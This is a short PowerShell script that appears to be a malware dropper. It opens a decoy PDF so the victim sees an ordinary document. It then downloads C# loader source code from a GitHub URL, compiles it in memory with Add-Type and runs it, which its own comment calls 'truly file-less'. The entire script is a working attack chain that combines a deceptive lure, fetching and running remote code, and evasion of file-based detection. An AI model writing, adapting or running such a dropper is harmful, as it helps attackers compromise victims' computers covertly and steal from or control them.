# The correct, truly file-less script
$scriptPath = $MyInvocation.MyCommand.Path
$dir = Split-Path $scriptPath

# 1. Open the decoy PDF
try { Start-Process -FilePath (Join-Path $dir 'your_pdf_name.pdf') } catch {}

# 2. Download the C# LOADER SOURCE CODE (not an exe)
$loaderSourceUrl = "https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/loader.cs"
$loaderSource = (New-Object Net.WebClient).DownloadString($loaderSourceUrl)

# 3. Compile and run the loader entirely in memory
Add-Type -TypeDefinition $loaderSource -Language CSharp
[Program]::Main($null)
